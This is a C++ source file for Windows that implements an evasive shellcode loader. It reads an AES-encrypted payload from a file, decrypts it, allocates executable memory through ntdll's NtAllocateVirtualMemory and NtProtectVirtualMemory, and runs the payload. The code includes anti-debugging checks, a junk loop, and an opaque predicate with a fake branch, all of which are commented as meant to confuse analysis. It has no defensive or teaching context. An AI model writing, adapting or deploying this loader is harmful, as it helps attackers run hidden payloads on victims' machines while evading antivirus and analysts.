#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <ntdef.h>
#include "aes.h"
#ifndef SIGTRAP
#define SIGTRAP 5  // Define SIGTRAP for MinGW
#endif
#include <signal.h>
#include <tomcrypt.h>


#define DEBUG_BREAK() raise(SIGTRAP)


FARPROC GetSyscallFunction(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return nullptr;

    FARPROC pFunction = GetProcAddress(hNtdll, functionName);
    if (!pFunction) return nullptr;

    return pFunction;
}


typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(WINAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);


void dummyLoop() {
    for (int i = 0; i < 1000; i++) {
        volatile int x = i * 200; 
        (void)x; 
    }
}

// Opaque predicate function (always returns true)
bool alwaysTrue() {
    volatile int x = 42;
    return x == 42;
}

// Anti-debugging: Check for a debugger using IsDebuggerPresent
bool isDebuggerPresent() {
    return IsDebuggerPresent() != 0;
}

// Anti-debugging: Crash if a debugger is detected
void crashIfDebugged() {
    if (isDebuggerPresent()) {
        DEBUG_BREAK(); // Trigger a breakpoint (debugger will catch this)
        exit(1); // Exit if no debugger is present
    }
}

// Read encrypted payload from file and extract key/IV
std::vector<uint8_t> readEncryptedPayload(const std::string& filePath, uint8_t* key, uint8_t* iv) {
    std::ifstream file("payload.enc", std::ios::binary);
    if (!file) {
        std::cerr << "Failed to open payload file." << std::endl;
        return {};
    }

    // Read key and IV (first 32 bytes)
    file.read(reinterpret_cast<char*>(key), 16);
    file.read(reinterpret_cast<char*>(iv), 16);

    // Read the rest of the file (encrypted payload)
    return std::vector<uint8_t>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// Decrypt payload using AES
std::vector<uint8_t> decryptPayload(const std::vector<uint8_t>& encryptedData, const uint8_t* key, const uint8_t* iv) {
    std::vector<uint8_t> decryptedData(encryptedData.size());
    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    memcpy(decryptedData.data(), encryptedData.data(), encryptedData.size());
    AES_CBC_decrypt_buffer(&ctx, decryptedData.data(), decryptedData.size());
    return decryptedData;
}

// Execute shellcode payload
void executeShellcode(const std::vector<uint8_t>& shellcode) {
    // Get syscall function pointers
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallFunction("NtAllocateVirtualMemory");
    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetSyscallFunction("NtProtectVirtualMemory");

    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory) {
        std::cerr << "Failed to resolve syscall functions." << std::endl;
        return;
    }

    // Allocate memory for the payload using syscall
    PVOID allocated_mem = nullptr;
    SIZE_T size = shellcode.size();
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),       // HANDLE ProcessHandle
        &allocated_mem,            // PVOID* BaseAddress
        0,                         // ULONG_PTR ZeroBits
        &size,                     // PSIZE_T RegionSize
        MEM_COMMIT | MEM_RESERVE,  // ULONG AllocationType
        PAGE_EXECUTE_READWRITE     // ULONG Protect
    );

    if (status != 0) {
        std::cerr << "Failed to allocate memory." << std::endl;
        return;
    }

    // Copy the payload into the allocated memory
    memcpy(allocated_mem, shellcode.data(), shellcode.size());

    // Change memory protection to PAGE_EXECUTE_READ using syscall
    ULONG oldProtect;
    status = NtProtectVirtualMemory(
        GetCurrentProcess(),       // HANDLE ProcessHandle
        &allocated_mem,           // PVOID* BaseAddress
        &size,                    // PSIZE_T RegionSize
        PAGE_EXECUTE_READ,        // ULONG NewProtect
        &oldProtect               // PULONG OldProtect
    );

    if (status != 0) {
        std::cerr << "Failed to change memory protection." << std::endl;
        return;
    }

    // Execute the payload
    ((void(*)())allocated_mem)();

    // Clean up
    VirtualFree(allocated_mem, 0, MEM_RELEASE);
}

int main() {
    // Anti-debugging: Crash if a debugger is detected
    crashIfDebugged();

    // Add a dummy loop
    dummyLoop();

    // Opaque predicate to confuse static analysis
    if (alwaysTrue()) {
        // Key and IV (will be read from the payload file)
        uint8_t key[16], iv[16];

        // Read encrypted payload from file and extract key/IV
        std::string payloadFilePath = "payload.enc";
        std::vector<uint8_t> encryptedPayload = readEncryptedPayload(payloadFilePath, key, iv);
        if (encryptedPayload.empty()) {
            std::cerr << "Failed to read payload." << std::endl;
            return 1;
        }

        // Decrypt payload
        std::vector<uint8_t> decryptedPayload = decryptPayload(encryptedPayload, key, iv);
        if (decryptedPayload.empty()) {
            std::cerr << "Failed to decrypt payload." << std::endl;
            return 1;
        }

        // Execute payload (assume it's shellcode for this example)
        executeShellcode(decryptedPayload);
    } else {
        // Fake branch (never executed)
        std::cout << "This is a fake branch." << std::endl;
    }

    return 0;
}
